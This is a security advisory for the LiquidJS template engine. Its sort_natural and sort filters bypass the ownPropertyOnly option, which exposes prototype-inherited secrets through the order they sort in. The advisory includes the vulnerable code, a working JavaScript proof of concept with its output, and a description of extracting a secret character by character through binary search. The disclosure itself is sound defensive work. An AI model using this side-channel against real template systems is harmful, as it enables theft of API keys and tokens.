# [M] LiquidJS: ownPropertyOnly bypass via sort_natural filter — prototype property information disclosure through sorting side-channel

## Summary
Severity: Medium
Advisory: GHSA-rv5g-f82m-qrvv
CVE: CVE-2026-39412
CWE: CWE-200
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-rv5g-f82m-qrvv
Type: github-advisory

## Affected
- npm: `liquidjs` — affected >=0 <10.25.4

## Details
### Summary

The `sort_natural` filter bypasses the `ownPropertyOnly` security option, allowing template authors to extract values of prototype-inherited properties through a sorting side-channel attack. Applications relying on `ownPropertyOnly: true` as a security boundary (e.g., multi-tenant template systems) are exposed to information disclosure of sensitive prototype properties such as API keys and tokens.

### Details

In `src/filters/array.ts`, the `sort_natural` function (lines 40-48) accesses object properties using direct bracket notation (`lhs[propertyString]`), which traverses the JavaScript prototype chain:

```typescript
export function sort_natural<T> (this: FilterImpl, input: T[], property?: string) {
  const propertyString = stringify(property)
  const compare = property === undefined
    ? caseInsensitiveCompare
    : (lhs: T, rhs: T) => caseInsensitiveCompare(lhs[propertyString], rhs[propertyString])
  const array = toArray(input)
  this.context.memoryLimit.use(array.length)
  return [...array].sort(compare)
}
```

In contrast, the correct approach used elsewhere in the codebase goes through `readJSProperty` in `src/context/context.ts`, which checks `hasOwnProperty` when `ownPropertyOnly` is enabled:

```typescript
export function readJSProperty (obj: Scope, key: PropertyKey, ownPropertyOnly: boolean) {
  if (ownPropertyOnly && !hasOwnProperty.call(obj, key) && !(obj instanceof Drop)) return undefined
  return obj[key]
}
```

The `sort_natural` filter bypasses this check entirely. The `sort` filter (lines 26-38 in the same file) has the same issue.

### PoC

```javascript
const { Liquid } = require('liquidjs');

async function main() {
  const engine = new Liquid({ ownPropertyOnly: true });

  // Object with prototype-inherited secret
  function UserModel() {}
  UserModel.prototype.apiKey = 'sk-1234-secret-token';

  const target = new UserModel();
  target.name = 'target';

  const probe_a = { name: 'probe_a', apiKey: 'aaa' };
  const probe_z = { name: 'probe_z', apiKey: 'zzz' };

  // Direct access: correctly blocked by ownPropertyOnly
  const r1 = await engine.parseAndRender('{{ users[0].apiKey }}', { users: [target] });
  console.log('Direct access:', JSON.stringify(r1));  // "" (blocked)

  // map filter: correctly blocked
  const r2 = await engine.parseAndRender('{{ users | map: "apiKey" }}', { users: [target] });
  console.log('Map filter:', JSON.stringify(r2));  // "" (blocked)

  // sort_natural: BYPASSES ownPropertyOnly
  const r3 = await engine.parseAndRender(
    '{% assign sorted = users | sort_natural: "apiKey" %}{% for u in sorted %}{{ u.name }},{% endfor %}',
    { users: [probe_z, target, probe_a] }
  );
  console.log('sort_natural order:', r3);
  // Output: "probe_a,target,probe_z,"
  // If apiKey were blocked: original order "probe_z,target,probe_a,"
  // Actual: sorted by apiKey value (aaa < sk-1234-secret-token < zzz)
}

main();
```

**Result:**
```
Direct access: ""
Map filter: ""
sort_natural order: probe_a,target,probe_z,
```

The sorted order reveals that the target's prototype `apiKey` falls between "aaa" and "zzz". By using more precise probe values, the full secret can be extracted character-by-character through binary search.

### Impact

Information disclosure vulnerability. Any application using LiquidJS with `ownPropertyOnly: true` (the default since v10.x) where untrusted users can write templates is affected. Attackers can extract prototype-inherited secrets (API keys, tokens, passwords) from context objects via the `sort_natural` or `sort` filters, bypassing the security control that is supposed to prevent prototype property access.

## References
- https://github.com/harttle/liquidjs/security/advisories/GHSA-rv5g-f82m-qrvv
- https://nvd.nist.gov/vuln/detail/CVE-2026-39412
- https://github.com/harttle/liquidjs/pull/869
- https://github.com/harttle/liquidjs/commit/e743da0020d34e2ee547e1cc1a86b58377ebe1ce
- https://github.com/harttle/liquidjs
- https://github.com/harttle/liquidjs/releases/tag/v10.25.4
